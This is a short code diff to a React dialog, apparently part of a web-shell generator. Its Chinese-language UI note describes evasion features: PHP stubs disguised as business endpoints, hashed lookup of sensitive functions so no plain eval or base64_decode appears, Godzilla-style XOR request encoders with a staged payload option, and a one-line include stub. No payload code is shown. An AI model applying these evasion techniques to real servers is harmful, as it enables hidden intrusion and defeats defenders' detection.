@@ -133,7 +133,8 @@ export function GenerateShellDialog({
             <p className="form-note">
               OPSEC：PHP stub 已做业务伪装（形如业务接口，敏感函数经 crc32b
               哈希查表解析，无小写 eval(/base64_decode( 等敏感词）；
-              XOR_BODY 编码器为请求体 XOR 直传（Godzilla 风格），默认配置可用；
+              XOR_BODY / XOR_SESSION 为请求体 XOR 直传（Godzilla 风格），默认配置
+              可用（XOR_SESSION 采用分阶段载荷：代码只传一次，之后仅传参数）；
               PHP_STREAM 为一行 INCLUDE stub（零敏感函数），需 allow_url_include=On。
             </p>
           </div>
